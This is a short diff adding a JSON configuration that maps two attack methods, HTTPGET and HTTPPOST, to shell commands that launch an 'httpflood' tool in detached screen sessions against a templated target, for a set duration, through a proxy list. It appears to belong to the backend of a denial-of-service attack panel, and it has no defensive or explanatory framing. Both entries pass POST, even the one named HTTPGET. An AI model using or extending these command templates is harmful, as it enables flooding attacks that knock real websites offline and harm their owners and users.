@@ -1,0 +1,4 @@
+{
+    "HTTPGET": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt",
+    "HTTPPOST": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt"
+}
